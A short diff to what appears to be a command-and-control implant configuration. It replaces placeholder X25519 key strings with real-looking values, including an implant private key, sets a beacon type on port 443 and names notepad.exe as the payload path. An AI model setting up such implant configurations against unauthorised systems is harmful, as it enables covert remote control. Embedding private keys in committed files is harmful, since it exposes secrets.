@@ -4,8 +4,10 @@
 
   "port": 443,
 
-  "implantPriv": "base64+encoded+X25519+implant+private+key+here",
-  "serverPub": "base64+encoded+X25519+server+PUBLIC+key+here",
+  "implantPriv": "HcmAncADdvC/NwPtmbICsv0T/REz2wzVKabicC4XHRQ",
+  "serverPub": "O8AVou/joDQhdygWkaUc+wQJFVeq+z24c2bWiRgKmwk",
+
+  "type": "beacon",
 
   "payload": {
     "Path": "C:\\Windows\\system32\\notepad.exe",
